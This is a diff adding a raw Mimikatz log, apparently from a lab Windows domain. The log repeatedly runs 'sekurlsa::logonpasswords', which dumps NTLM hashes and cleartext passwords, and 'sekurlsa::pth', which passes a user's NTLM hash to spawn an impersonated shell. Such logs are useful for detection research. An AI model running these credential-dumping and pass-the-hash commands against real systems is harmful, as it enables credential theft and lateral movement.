@@ -1,0 +1,1009 @@
+Using 'C:\prehendo\Logs\attack3.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 900475 (00000000:000dbd7b)
+Session           : RemoteInteractive from 3
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:31:12 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	 [00000003] Primary
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * NTLM     : dea9842ccd23638c4a8348b42782dedc
+	 * SHA1     : ebc68a7f1091f62dcc1507cd69701731c3af0e08
+	 * DPAPI    : 5d5459e523bc10c56f93ce0273521e2f
+	tspkg :	
+	wdigest :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * Password : 34099hfnEW(fk2
+	kerberos :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 891159 (00000000:000d9917)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 891099 (00000000:000d98db)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 890371 (00000000:000d9603)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-96-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 313139 (00000000:0004c733)
+Session           : RemoteInteractive from 2
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:28:25 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 47129 (00000000:0000b819)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 47068 (00000000:0000b7dc)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : winclt10$
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25733 (00000000:00006485)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25592 (00000000:000063f8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 22487 (00000000:000057d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : winclt10$
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # sekurlsa::pth /user:bob /domain:prehendo.local /ntlm:0f208022007afc38c1fa841d45f0253c
+user	: bob
+domain	: prehendo.local
+program	: cmd.exe
+impers.	: no
+NTLM	: 0f208022007afc38c1fa841d45f0253c
+  |  PID  4896
+  |  TID  7292
+  |  LSA Process is now R/W
+  |  LUID 0 ; 1556312 (00000000:0017bf58)
+  \_ msv1_0   - data copy @ 0000019F91C7B9B0 : OK !
+  \_ kerberos - data copy @ 0000019F91C4F608
+   \_ aes256_hmac       -> null             
+   \_ aes128_hmac       -> null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000019F91BF6418 (32) -> null
+
+mimikatz # Using 'C:\prehendo\Logs\attack3.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1556312 (00000000:0017bf58)
+Session           : NewCredentials from 0
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:37:46 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	 [00000003] Primary
+	 * Username : bob
+	 * Domain   : prehendo.local
+	 * NTLM     : 0f208022007afc38c1fa841d45f0253c
+	tspkg :	
+	wdigest :	
+	 * Username : bob
+	 * Domain   : prehendo.local
+	 * Password : (null)
+	kerberos :	
+	 * Username : bob
+	 * Domain   : prehendo.local
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 900475 (00000000:000dbd7b)
+Session           : RemoteInteractive from 3
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:31:12 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	 [00000003] Primary
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * NTLM     : dea9842ccd23638c4a8348b42782dedc
+	 * SHA1     : ebc68a7f1091f62dcc1507cd69701731c3af0e08
+	 * DPAPI    : 5d5459e523bc10c56f93ce0273521e2f
+	tspkg :	
+	wdigest :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * Password : 34099hfnEW(fk2
+	kerberos :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 891159 (00000000:000d9917)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 891099 (00000000:000d98db)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 890371 (00000000:000d9603)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-96-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 313139 (00000000:0004c733)
+Session           : RemoteInteractive from 2
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:28:25 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 47129 (00000000:0000b819)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 47068 (00000000:0000b7dc)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:58 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : winclt10$
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25733 (00000000:00006485)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 25592 (00000000:000063f8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 22487 (00000000:000057d7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WinClt10$
+Domain            : PREHENDO
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:27:57 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : winclt10$
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # sekurlsa::pth /user:bob /domain:prehendo.local /ntlm:0f208022007afc38c1fa841d45f0253c
+user	: bob
+domain	: prehendo.local
+program	: cmd.exe
+impers.	: no
+NTLM	: 0f208022007afc38c1fa841d45f0253c
+  |  PID  1768
+  |  TID  7400
+  |  LSA Process is now R/W
+  |  LUID 0 ; 1606153 (00000000:00188209)
+  \_ msv1_0   - data copy @ 0000019F91C7B1F0 : OK !
+  \_ kerberos - data copy @ 0000019F91C4F068
+   \_ aes256_hmac       -> null             
+   \_ aes128_hmac       -> null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000019F91BF6748 (32) -> null
+
+mimikatz(commandline) # exit
+Bye!
+Using 'C:\prehendo\Logs\attack3.log' for logfile : OK
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 900475 (00000000:000dbd7b)
+Session           : RemoteInteractive from 3
+User Name         : prehendo
+Domain            : PREHENDO
+Logon Server      : WinSrv2016
+Logon Time        : 4/23/2020 9:31:12 PM
+SID               : S-1-5-21-537376977-3063072343-2736872708-500
+	msv :	
+	 [00000003] Primary
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * NTLM     : dea9842ccd23638c4a8348b42782dedc
+	 * SHA1     : ebc68a7f1091f62dcc1507cd69701731c3af0e08
+	 * DPAPI    : 5d5459e523bc10c56f93ce0273521e2f
+	tspkg :	
+	wdigest :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO
+	 * Password : 34099hfnEW(fk2
+	kerberos :	
+	 * Username : prehendo
+	 * Domain   : PREHENDO.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 891159 (00000000:000d9917)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * NTLM     : 41a772bc54a1e47fe659a8dc108610c4
+	 * SHA1     : fd5abe29955441c723fbb317fc1986f4a55a13e7
+	tspkg :	
+	wdigest :	
+	 * Username : WinClt10$
+	 * Domain   : PREHENDO
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	kerberos :	
+	 * Username : WinClt10$
+	 * Domain   : prehendo.local
+	 * Password : gs#rf]]tA,Xbb@Tyw&2hF3.cn,eg:h_G<<h,?bZkUHyvxN7kJxH#xs2(&L8HU@N2C,j"6eDC4[!$ws9#?\:n0v*ki*wwkzC?^%cf^lqANv%.aX$pd$H \ylz
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 891099 (00000000:000d98db)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/23/2020 9:31:11 PM
+SID               : S-1-5-90-0-3
